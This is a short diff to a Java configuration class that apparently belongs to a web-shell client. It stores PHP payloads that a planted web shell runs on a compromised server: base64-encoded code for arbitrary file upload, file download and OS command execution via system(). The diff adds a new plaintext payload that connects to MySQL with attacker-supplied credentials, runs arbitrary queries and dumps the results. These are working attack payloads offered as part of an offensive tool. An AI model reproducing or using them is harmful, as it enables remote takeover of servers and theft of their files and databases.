@@ -80,7 +80,7 @@ public class InitConfig {
 		config.setValue("PHP_UPLOAD", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D");
 		config.setValue("PHP_DOWNLOAD", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7");
 		config.setValue("PHP_SHELL", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D");
-
+		config.setValue("PHP_DB_MYSQL", "@ini_set ( \"display_errors\", \"0\" );@set_time_limit ( 0 );@set_magic_quotes_runtime ( 0 );echo (\"->|\");;$m = get_magic_quotes_gpc ();$conf = $m ? stripslashes ( $_POST [\"z1\"] ) : $_POST [\"z1\"];$ar = explode(\"choraheiheihei\", $conf);$dbn = $m ? stripslashes ( $_POST [\"z2\"] ) : $_POST [\"z2\"];$sql = base64_decode ( $_POST [\"z3\"] );$T = @mysql_connect($ar[0],$ar[1],$ar[2]);@mysql_query ( \"SET NAMES utf8\" );if($dbn==\"\"){$sql = \"SHOW DATABASES\";}else{	@mysql_select_db ( $dbn );}$q = @mysql_query ( $sql );$i = 0;while ( $col = @mysql_field_name ( $q, $i ) ) {echo ($col . \"\\t|\\t\");$i ++;}echo (\"\\r\\n\");while ( $rs = @mysql_fetch_row ( $q ) ) {for($c = 0; $c < $i; $c ++) {echo (trim ( $rs [$c] ));echo (\"\\t|\\t\");}echo (\"\\r\\n\");}@mysql_close ( $T );;echo (\"|<-\");die ();");
 		
 		
 		
@@ -133,7 +133,10 @@ public class InitConfig {
 		Safe.PHP_UPLOAD = config.getValue("PHP_UPLOAD");
 		Safe.PHP_DOWNLOAD = config.getValue("PHP_DOWNLOAD");
 		Safe.PHP_SHELL = config.getValue("PHP_SHELL");
-
+		//sjs add
+		Safe.PHP_DB_MYSQL = config.getValue("PHP_DB_MYSQL");
+		
+		
 		Safe.JSP_BASE64 = config.getValue("JSP_BASE64");
 		Safe.JSP_MAKE = config.getValue("JSP_MAKE");
 		Safe.JSP_INDEX = config.getValue("JSP_INDEX");
